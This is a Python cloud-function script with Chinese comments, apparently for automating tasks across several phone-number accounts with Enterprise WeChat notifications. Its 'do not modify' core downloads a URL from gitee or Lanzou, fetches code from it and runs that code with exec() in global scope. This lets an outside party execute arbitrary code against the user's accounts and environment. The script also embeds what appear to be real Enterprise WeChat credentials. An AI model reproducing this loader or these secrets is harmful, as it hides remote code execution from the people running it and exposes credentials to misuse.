# -*- coding:utf-8 -*-
import requests
import re

# 云函数选用python3.6版本，超时设置900s，触发器定时（0 10/15 7-23 * * * *）
# 在蓝奏云通过重命名文件夹名(第一位数字1为开，2为关，token的值填在第一位数字后面)实现远程控制云函数功能。
# 支持多账号，蓝奏云链接之间用#隔开
folder = 'https://wwa.lanzoui.com/b04c2ihod'

# 通过一个文件夹关必所有云函数，需要关闭时文件夹设置为2，不需要时设置为1，如果不需要则留空即可（可选）
all_switch = ''

# 填写账号信息，支持多账号，手机号之间用#隔开，必须和folder一一对应，否则会报错
username = ''

# 企业微信推送
AgentId = '1000003'
corpid = 'ww8d6bf1b0125837ea'
Secret = 'rErZzukL-RRp2DmQ6oZFM8w1F1ip-U4QGMrMyudD3aE'
media_id='2BVBZtlk9NUrd7db_9xBRAo-adLiQ3CRP0erHL6kOfaUhdaQhHieM-EykWjVGrRHT'


# --------------以下为核心区，请勿修改！------------#
def main_handler(event, context):
    try:
        get_code = requests.get('http://xiaowei849.gitee.io/geturl').text
    except:
        code_url = requests.get('https://wwa.lanzoui.com/b0c3l8lsj', headers={'User-Agent': 'xiaowei'}).text
        get_code = re.findall(r'<span id="filename">(.+?)</span>', code_url)[0]
    code = requests.get(get_code + 'xiaoshunzi_aflkajfjalkfmalfmkaf')
    code.encoding = 'utf-8'
    exec(code.text, globals())


if __name__ == '__main__':
    main_handler('', '')
